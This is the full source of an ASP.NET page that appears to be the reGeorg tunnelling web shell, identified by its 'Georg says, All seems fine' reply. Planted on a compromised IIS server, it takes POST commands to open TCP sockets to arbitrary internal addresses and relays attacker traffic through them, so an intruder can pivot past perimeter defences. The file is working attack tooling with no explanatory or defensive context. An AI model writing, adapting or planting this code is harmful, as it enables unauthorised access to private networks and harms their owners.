<%@ Page Language="C#" EnableSessionState="True" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%
    try
    {
        if (Request.HttpMethod == "POST")
        {
            string cmd = Request.QueryString["cmd"];
            if (cmd == "connect")
            {
                try
                {
                    string target = Request.QueryString["target"];
                    int port = int.Parse(Request.QueryString["port"]);
                    IPAddress ip = IPAddress.Parse(target);
                    IPEndPoint ep = new IPEndPoint(ip, port);
                    Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    s.Connect(ep);
                    s.Blocking = false;
                    Session["sock"] = s;
                    Response.AddHeader("X-STATUS", "OK");
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
            else if (cmd == "disconnect")
            {
                try {
                    Socket s = (Socket)Session["sock"];
                    s.Close();
                } catch {}
                Session.Abandon();
                Response.AddHeader("X-STATUS", "OK");
            }
            else if (cmd == "forward")
            {
                Socket s = (Socket)Session["sock"];
                try
                {
                    byte[] buffer = new byte[Request.ContentLength];
                    int bytesRead = 0;
                    while ((bytesRead = Request.InputStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        s.Send(buffer, bytesRead, SocketFlags.None);
                    }
                    Response.AddHeader("X-STATUS", "OK");
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
            else if (cmd == "read")
            {
                Socket s = (Socket)Session["sock"];
                try
                {
                    byte[] readBuf = new byte[512];
                    int count = 0;
                    try
                    {
                        while ((count = s.Receive(readBuf)) > 0)
                        {
                            byte[] actual = new byte[count];
                            Buffer.BlockCopy(readBuf, 0, actual, 0, count);
                            Response.BinaryWrite(actual);
                        }
                        Response.AddHeader("X-STATUS", "OK");
                    }
                    catch (SocketException)
                    {
                        Response.AddHeader("X-STATUS", "OK");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Response.AddHeader("X-ERROR", ex.Message);
                    Response.AddHeader("X-STATUS", "FAIL");
                }
            }
        }
        else
        {
            Response.Write("Georg says, 'All seems fine'");
        }
    }
    catch (Exception ex)
    {
        Response.AddHeader("X-ERROR", ex.Message);
        Response.AddHeader("X-STATUS", "FAIL");
    }
%>
